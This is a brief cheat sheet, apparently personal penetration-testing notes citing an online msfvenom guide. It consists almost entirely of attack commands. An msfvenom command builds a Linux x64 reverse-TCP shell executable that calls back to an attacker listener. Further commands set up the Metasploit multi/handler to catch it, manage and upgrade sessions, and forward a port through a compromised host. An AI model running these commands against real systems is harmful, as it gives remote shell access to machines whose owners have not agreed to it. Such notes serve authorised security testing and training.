<https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/>
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 -f elf > shell-x64.elf
```
### multi handler:
```
use exploit/multi/handler
set lhost eth0
set lport 443
run
```
### basic navigation and session management:
```
ctrl + z
search shell_to
use 0
sessions
set session 5
run
sessions 6
```
### single port forwarding:
```
portfwd add -l 1234 -p 8080 -r 127.0.0.1
```